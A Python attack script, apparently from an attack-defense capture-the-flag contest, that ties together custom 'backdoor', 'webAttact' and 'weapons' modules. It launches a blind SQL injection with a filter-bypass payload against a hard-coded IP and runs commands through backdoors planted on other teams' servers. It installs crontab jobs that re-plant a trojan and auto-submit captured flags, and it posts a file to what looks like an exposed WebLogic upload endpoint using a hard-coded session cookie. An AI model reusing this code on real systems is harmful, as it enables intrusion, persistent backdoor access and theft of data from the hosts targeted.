import backdoor
import webAttact
import weapons
import requests
import config
import tools
import time
import ssh
import random
import threading
import base64
import os
def blindSql():
    length=32
    webAttact.MapAttacker('http://123.206.87.240:9004/1ndex.php?id=5\' aandnd {0} --+',length,0,65536).StartAttack()

def bckDoor(w):
    w.useBckDoorIndex=0 #使用哪个后门
    
    # print(backdoor.eachIp(w.trojTime))
    # print(backdoor.eachIpArgs(w.runCmd,'*.php'))
    print(backdoor.eachIpArgs(w.runCmd,'ls -al'))
    print(backdoor.eachIpArgs(w.runTeamCmd,'system(\'whoami\')'))
    
    print(backdoor.eachIpArgs(buildAndRunCrontabCmd,w))
def buildAndRunCrontabCmd(index,w):
    rawCrontabStr_autoSubmit=tools.buildCrontab('*',config.gameUrl,f'token={config.token}&flag=`date +\'%s\'`',1)
    rawCrontabStr_troj=tools.buildCrontab('*',w.team[index].trojContent,'',2)

    crontabStr,md5Str=tools.buildCmd(f"{rawCrontabStr_autoSubmit}\n{rawCrontabStr_troj}")
    w.runTeamCmd(index,f'system(\'{crontabStr}\')')
    return w.runTeamCmd(index,f'system(\'/usr/bin/crontab /tmp/.--{md5Str}.sh\')')
def upload(rawFile):
    url=f'http://47.74.224.5:37002/ws_utc/resources/setting/keystore?timestamp={int(time.time()*1000)}'
    
    file = {'id': (None, 'WU_FILE_0'), 
         'name':  (None, f'{random.randint(1000,9999)}sf.MP4'), 
         'type': (None, 'plan/text'),
         'lastModifiedDate': (None, 'Sat Oct 21 2019 13:20:12 GMT+0800 (中国标准时间)'),
         'size': (None,'1555'), 
         'file': (f'{random.randint(1000,9999)}sf.MP4', rawFile, 'plan/text')} # 
    headers={'Cookies':'wordpress_test_cookie=WP+Cookie+check; JSESSIONID=Mcq-T51fXGCkf7_F-mAFL-5kExiIVxL4PoLR53sXTpDjn-8xoErF!779300569'}
    r=requests.post(url=url,files=file,headers=headers)
    print(r.text)
class Runner(threading.Thread):
    def __init__(self,constantRun=False):
        super(Runner,self).__init__()
        self.constantRun=constantRun
    def run(self):
        while True:
            seed=str(random.randint(1000,9999))
            w=weapons.weapons(seed[:-3])
            bckDoor(w)
            if not self.constantRun:
                return
if __name__ == "__main__":
    print('script start')
    ssh=ssh.SSHserver(
        ssh.ServerConfig(
            ssh.sshConfig(
                config.sshConfig['hostname'],
                config.sshConfig['port'],
                config.sshConfig['username'],
                config.sshConfig['password'],
                config.sshConfig['pfile']
            ),
            ssh.DbConfig(
                config.dbConfig['dbName'],
                config.dbConfig['username'],
                config.dbConfig['password']
                ),
            config.localBkPath,
            config.webrootPath))
    ssh.connect()
    stdin,stdout,stderr=ssh.execCmd('ls -al /app')
    print(stdout.read().decode())
    stdin,stdout,stderr=ssh.execCmd('whoami')
    print(stdout.read().decode())
    ssh.disconnect()
    #blindSql()
    # for i in range(1):
    #     Runner(True).start()
    
    # rawFile=open('1.mp4', 'rb')
    # while True:
    #     Runner()
    pass
